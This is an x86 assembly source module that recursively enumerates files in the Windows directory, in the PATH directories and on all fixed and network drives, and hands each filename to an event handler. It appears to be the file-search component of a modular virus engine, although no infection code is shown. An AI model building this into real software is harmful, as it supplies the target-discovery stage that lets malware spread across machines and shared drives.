
RECSERCH_MAXFILENAME    equ     1024

include                 RECSERCH.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\FILEIO\fileio.inc
include                 ..\MAIN\main.inc

                        extern  Event:PROC

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

recserch_complete       db      0

ff                      ff_struc ?

                        .code

HandleEvent:            cmp     dword ptr [esp+4], EV_MAIN_IDLE
                        je      __do_recserch

__return_0:             xor     eax, eax
                        retn

__do_recserch:          cmp     recserch_complete, 0
                        jne     __return_0
                        inc     recserch_complete

                        pusha
                        cld

                        lea     edi, ff

                        call    process_windir
                        call    process_path
                        call    process_drives

                        popa

                        mov     eax, 1
                        retn

; subroutine: process_windir
; action:     process md directory & all subdirs
;             1. get %windir%
;             2. call process_directory
; input:      EDI=ff_struc
; output:     none

process_windir:         pusha
                        sub     esp, RECSERCH_MAXFILENAME
                        push    esp
                        callW   getwindir
                        mov     edx, esp
                        call    process_directory
                        add     esp, RECSERCH_MAXFILENAME
                        popa
                        retn

; subroutine: process_path
; action:     process all dirs/subdirs from %path%
;             1. get %path%
;             2. parse %path% and call process_directory for each dirname
; input:      EDI=ff_struc
; output:     none

process_path:           pusha
                        mov     eax, cs
                        cmp     eax, 28h
                        je      __quit
                        cld
                        sub     esp, RECSERCH_MAXFILENAME
                        mov     esi, esp
                        mov     dword ptr [esi], 'HTAP'
                        mov     byte ptr [esi+4], 0
                        mov     ebx, RECSERCH_MAXFILENAME-1
                        push    ebx
                        push    esi
                        push    esi
                        callW   GetEnvironmentVariableA
                        mov     byte ptr [esi+ebx], 0
__cycle:                mov     edx, esi
__scan:                 lodsb
                        or      al, al
                        jz      __done
                        cmp     al, ';'
                        jne     __scan
__done:                 sub     [esi-1], al
                        call    process_directory
                        or      al, al
                        jnz     __cycle
                        add     esp, RECSERCH_MAXFILENAME
__quit:                 popa
                        retn

; subroutine: process_drives
; action:     for each drive (A:..Z:) with type DRIVE_FIXED||DRIVE_REMOTE
;             call subroutine process_directory passing drive's root as arg
; input:      EDI=ff_struc
; output:     none

process_drives:         pusha
                        push    '\:C'
__cycle:                mov     eax, cs
                        cmp     eax, 28h
                        je      __do
                        push    esp
                        callW   GetDriveTypeA
                        cmp     eax, DRIVE_FIXED
                        je      __do
                        cmp     eax, DRIVE_REMOTE
                        jne     __next
__do:                   mov     edx, esp
                        call    process_directory
__next:                 inc     byte ptr [esp]
                        cmp     byte ptr [esp], 'Z'
                        jbe     __cycle
                        pop     eax
                        popa
                        retn

; subroutine: process_directory
; action:     1. set current directory to one specified by EDX
;             2. find all files in the current directory
;             3. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
;             4. set current directory to ".."
; input:      EDI=ff_struc
;             EDX=directory name (should be full path if 1st call)
; output:     none

process_directory:      pusha
                        sub     esp, RECSERCH_MAXFILENAME
                        cld

                        mov     ebx, edi
                        mov     esi, edx
                        mov     edi, esp
__1:                    lodsb
                        stosb
                        or      al, al
                        jnz     __1
                        dec     edi
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:                    mov     ebp, edi
                        mov     eax, '*.*'
                        stosd
                        mov     edi, ebx

                        mov     eax, esp
                        push    edi     ; ff_struc
                        push    eax     ; mask
                        callW   findfirst

                        or      eax, eax
                        jz      __quit

                        xchg    esi, eax
__cycle:
                        pusha
                        lea     esi, [edi].ff_fullname
                        mov     edi, ebp
__2:                    lodsb
                        stosb
                        or      al, al
                        jnz     __2
                        popa

                        mov     edx, esp

                        test    byte ptr [edi].ff_attr, 16      ; directory?
                        jnz     __dir

                        call    process_file

                        jmp     __next

__dir:                  lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'
                        je      __next

                        call    process_directory

__next:                 push    edi     ; ff_struc
                        push    esi     ; handle
                        callW   findnext

                        or      eax, eax
                        jnz     __cycle

                        push    esi
                        callW   findclose

__quit:                 add     esp, RECSERCH_MAXFILENAME
                        popa
                        retn

;----------------------------------------------------------------------------

; subroutine: process_file
; action:     handle each file found by process_directory
; input:      EDI=ff_struc
;             EDX=file name ([edi].ff_fullname)
; output:     none

process_file:           pusha

                        push    edx
                        push    EV_RECSERCH_GOT_FILENAME
                        call    Event
                        add     esp, 8

                        popa
                        retn

                        end
